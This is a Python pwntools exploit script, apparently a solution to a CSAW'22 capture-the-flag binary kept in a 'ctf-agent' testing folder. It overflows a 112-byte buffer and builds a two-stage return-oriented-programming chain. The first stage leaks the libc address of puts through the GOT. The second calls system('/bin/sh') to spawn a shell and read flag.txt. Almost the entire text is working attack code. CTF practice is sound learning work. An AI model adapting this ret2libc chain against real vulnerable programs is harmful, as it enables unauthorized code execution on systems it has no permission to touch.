from pwn import *

# Set context
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

binary_path = '/home/pwnphofun/Code/programming/MCP/ctf-agent/testing/rev/rebug_1/test.out'
# libc_path = '/lib/x86_64-linux-gnu/libc.so.6' # We will load this dynamically if needed

elf = ELF(binary_path)
# libc = ELF(libc_path) # Don't load yet, allow finding it or use default

p = process(binary_path)

# --- Stage 1: Leak Libc ---

# Offset to ROP chain
# Buffer is 112 bytes (0x70).
# Pivot sets RSP to Buffer + 0x70.
# LEAVE pops RBP (8 bytes).
# RET executes next.
# So ROP starts at offset 112 + 8 = 120.

padding = b'\0' * 112 # Satisfies check (first byte 0)
fake_rbp = b'B' * 8

pop_rdi = 0x4015a3
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x40150b
ret_gadget = 0x401016 

payload = padding + fake_rbp
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

print("Sending Stage 1 Payload...")
p.recvuntil(b'String: ')
p.send(payload)

# Receive output
# First we get "Nice to meet you..." from check
p.recvuntil(b'Welcome to CSAW\'22!\n')

# Next is the leak
leak_data = p.recvline().strip()
if not leak_data:
    leak_data = p.recvline().strip()

print(f"Leak Data: {leak_data}")
leak = u64(leak_data.ljust(8, b'\0'))
print(f"Leaked puts: {hex(leak)}")

# Identify libc
try:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = leak - libc.symbols['puts']
    print(f"Libc Base: {hex(libc.address)}")
except:
    print("Could not load local libc, assuming remote environment differs.")
    # Fallback or generic handling if needed

# --- Stage 2: Shell ---

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

payload2 = padding + fake_rbp
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(ret_gadget) # Alignment
payload2 += p64(system)

print("Sending Stage 2 Payload...")
p.recvuntil(b'String: ') # Main restarted
p.send(payload2)

# Interactive / Flag
p.clean()
p.sendline(b'cat flag.txt')
try:
    print(p.recvall(timeout=2).decode(errors='ignore'))
except:
    pass
p.close()